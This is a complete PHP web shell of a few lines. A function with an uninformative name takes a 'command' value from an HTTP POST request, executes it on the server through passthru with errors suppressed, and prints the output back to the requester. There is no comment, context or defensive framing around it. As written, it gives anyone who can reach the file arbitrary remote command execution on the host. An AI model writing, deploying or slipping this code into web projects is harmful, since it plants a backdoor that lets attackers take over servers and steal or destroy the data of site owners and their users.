<?php
function exTKL() {
	$in=$_POST['command'];
	$out = '';
	if (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}
	echo $out;
}

if (!$_POST['command'] == ''){
	exTKL();
}
?>